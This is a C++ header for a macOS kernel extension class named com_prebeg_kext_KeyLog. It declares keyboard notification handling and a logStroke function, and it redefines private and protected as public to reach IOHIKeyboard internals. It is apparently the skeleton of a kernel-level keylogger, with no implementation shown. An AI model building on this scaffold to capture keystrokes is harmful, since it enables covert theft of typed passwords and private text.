/* add your code here */

#include <IOKit/IOService.h>

#include <IOKit/IOService.h>
#include <IOKit/IOUserClient.h>
#include <IOKit/ndrvsupport/IOMacOSTypes.h>

/* trickery to fuck up with private variables LOL */
#define private public
#define protected public
#include <IOKit/hidsystem/IOHIKeyboard.h>
#undef private
#undef protected

class com_prebeg_kext_KeyLog : public IOService
{
    OSDeclareDefaultStructors(com_prebeg_kext_KeyLog)
public:
    virtual bool init(OSDictionary *dictionary = 0);
    virtual void free(void);
    virtual IOService *probe(IOService *provider, SInt32 *score);
    virtual bool start(IOService *provider);
    virtual void stop(IOService *provider);
    
    void                            clearKeyboards();

    // notif handler
    static bool notificationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier);
    
    OSArray                         *loggedKeyboards;
     UInt32                          kextKeys;
    void logStroke( unsigned key, unsigned flags, unsigned charCode );
};